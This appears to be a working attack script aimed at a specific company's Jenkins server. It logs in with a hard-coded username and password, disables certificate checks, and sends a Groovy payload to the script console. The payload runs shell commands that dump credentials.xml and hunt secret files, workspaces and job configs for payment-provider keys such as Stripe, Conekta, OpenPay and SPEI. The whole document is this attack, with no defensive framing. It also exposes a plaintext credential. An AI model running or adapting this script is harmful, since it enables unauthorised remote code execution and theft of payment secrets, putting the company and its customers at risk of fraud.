import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

GROOVY_SCRIPT = '''
def run(cmd) {
    def proc = ["bash", "-c", cmd].execute()
    proc.waitFor()
    return proc.text
}

println "========== PHASE 1: Search ALL Jenkins paths for payment keywords =========="
def search1 = run("find /var/jenkins_home -maxdepth 1 -type f -name '*.xml' 2>/dev/null | head -20")
println "Root XML files:"
println search1

println "========== PHASE 2: credentials.xml =========="
def creds = run("cat /var/jenkins_home/credentials.xml 2>/dev/null")
println creds

println "========== PHASE 3: Search workspace for payment files =========="
def ws = run("find /var/jenkins_home/workspace -type f \\\\( -name '*.env' -o -name '*.properties' -o -name '*.yml' -o -name '*.yaml' -o -name '*.json' \\\\) 2>/dev/null | xargs grep -il 't1pago\\\\|dispersi\\\\|payout\\\\|stripe\\\\|conekta\\\\|openpay\\\\|spei\\\\|clabe\\\\|merchant_key\\\\|secret_key\\\\|api_key\\\\|payment' 2>/dev/null | head -30")
println ws

println "========== PHASE 4: Search secrets and env-inject =========="
def sec = run("find /var/jenkins_home -path '*/secrets*' -type f 2>/dev/null | head -20; find /var/jenkins_home -name 'envinject*' -type f 2>/dev/null | head -10")
println sec

println "========== PHASE 5: Job configs mentioning payment =========="
def jobs = run("find /var/jenkins_home/jobs -name 'config.xml' 2>/dev/null | xargs grep -il 't1pago\\\\|dispersi\\\\|payout\\\\|conekta\\\\|openpay\\\\|stripe\\\\|spei' 2>/dev/null | head -15")
println jobs
'''

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cj),
    urllib.request.HTTPSHandler(context=ctx)
)

req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
r = opener.open(req, timeout=15)
crumb = json.loads(r.read().decode())

data = urllib.parse.urlencode({'script': GROOVY_SCRIPT}).encode()
req2 = urllib.request.Request(BASE + '/scriptText', data=data,
    headers={'Authorization': 'Basic ' + AUTH, crumb['crumbRequestField']: crumb['crumb']})
r2 = opener.open(req2, timeout=120)
output = r2.read().decode()
print(f"[+] Output ({len(output)} bytes):\n")
print(output)
